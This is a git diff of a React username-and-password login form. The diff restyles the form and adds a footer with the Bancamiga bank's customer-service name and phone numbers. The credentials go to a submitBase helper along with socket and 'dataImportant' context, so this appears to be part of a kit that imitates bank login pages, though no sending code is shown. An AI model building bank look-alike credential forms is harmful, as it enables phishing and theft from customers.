@@ -6,12 +6,10 @@ import { SocketContext, UserDataContext } from '../../../context'
 import { submitBase } from '../../../helpers/submitBase'
 import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
 import { Spiner } from '../../Spiner'
-import { UsernameAndPasswordError } from './UsernameAndPasswordError'
 import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'
-import { UsernameAndPasswordKeyword } from './UsernameAndPasswordKeyword'
 
 const valuesData = { username: '', password: '', typeDocument: '' }
-const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']
+const opciones = ['', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']
 
 export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl = '', virtualKeyword = false}) => {
     
@@ -32,7 +30,6 @@ export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl =
         // En caso de poner un error personalizado colocar errorUsername y errorPassword
         validate: values => usernameAndPasswordValidate({values, virtualKeyword}),
         onSubmit: async(valuesData) => {
-            valuesData.typeDocument = selectItem;
 
             submitBase({dataImportant, valuesData, endUrl})
         }
@@ -43,15 +40,6 @@ export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl =
             {/* Spiner de carga */}
             {
                 showSpiner === true ? <Spiner /> : null
-            }
-
-            {/* Aqui ira las notificacion de error en caso general */}
-            <UsernameAndPasswordError
-                touched={touched}
-                errors={errors}
-            />
-            {
-                virtualKeyword === true ? (<UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) : null
             }
             {/* Colocar diseño base */}
             <form className='flex flex-col' onSubmit={handleSubmit}>
@@ -74,6 +62,7 @@ export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl =
                     setSelectItem={setSelectItem}
                     opciones={opciones}
                 />
+                <div  className='w-full border-[1px] border-[#fafafa] my-[40px]' />
 
                 <button 
                         disabled={
@@ -93,11 +82,19 @@ export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl =
                                     )
                             ) == true ? true : false
                         }
-                    className='bg-blue-400 px-4 py-1 rounded'
+                    className='
+                        bg-[#89AD45] border-[1px] py-[6px] px-[12px] rounded-[2px] text-white
+                        hover:bg-[#89AD45] hover:border-[#78973B]  
+                        disabled:opacity-[0.65] border-[#78973B] 
+                    '
                     type='submit'
                 >
                     Ingresar
                 </button>
+                <span className='text-center'>Para mayor información o asesoria contáctanos al <br />
+                    Centro de atención Bancamiga (CAB) <br />
+                    0500-TUBANCA y 0500-1000400</span>
+
             </form>
         </div>
     )
